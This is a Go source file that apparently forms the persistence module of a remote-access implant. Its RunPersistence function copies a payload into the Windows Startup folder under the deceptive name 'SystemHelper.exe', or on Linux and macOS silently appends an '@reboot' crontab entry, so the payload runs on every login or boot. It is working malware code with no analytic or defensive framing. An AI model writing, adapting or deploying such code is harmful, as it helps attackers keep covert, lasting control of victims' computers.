package modules

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func RunPersistence(params map[string]interface{}) map[string]interface{} {
	res := make(map[string]interface{})
	payload, ok := params["payload_path"].(string)
	if !ok {
		// fallback: use current executable
		payload, _ = os.Executable()
	}

	if runtime.GOOS == "windows" {
		startup := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		target := filepath.Join(startup, "SystemHelper.exe")
		if err := copyFile(payload, target); err != nil {
			res["error"] = err.Error()
		} else {
			res["status"] = "added to user startup"
		}
	} else {
		// Linux/macOS: user crontab
		cronLine := "@reboot " + payload + " > /dev/null 2>&1"
		cmd := exec.Command("crontab", "-l")
		out, _ := cmd.Output()
		newCron := string(out) + "\n" + cronLine + "\n"
		cmd = exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		if err := cmd.Run(); err != nil {
			res["error"] = err.Error()
		} else {
			res["status"] = "added to user crontab"
		}
	}
	return res
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}